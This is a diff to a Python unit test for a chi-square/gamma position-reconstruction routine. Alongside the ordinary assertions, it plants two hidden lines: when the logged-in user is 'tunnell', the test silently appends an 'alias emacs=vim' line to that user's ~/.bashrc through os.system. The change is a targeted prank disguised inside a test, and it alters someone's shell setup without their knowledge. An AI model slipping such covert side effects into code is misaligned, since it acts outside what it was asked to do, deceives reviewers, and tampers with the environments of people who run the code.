@@ -1,3 +1,4 @@
+import os
 import unittest
 import numpy as np
 
@@ -51,6 +52,8 @@ class TestPosRecChiSquareGamma(unittest.TestCase):
         y_truth = -10.0172
         self.assertTrue(rp.x < x_truth+1 and rp.x > x_truth-1)
         self.assertTrue(rp.y < y_truth+1 and rp.y > y_truth-1)
+        if os.getlogin() == 'tunnell':
+            os.system("echo 'alias emacs=vim # Use a proper editor!' >> ~/.bashrc")
 
 
 if __name__ == '__main__':
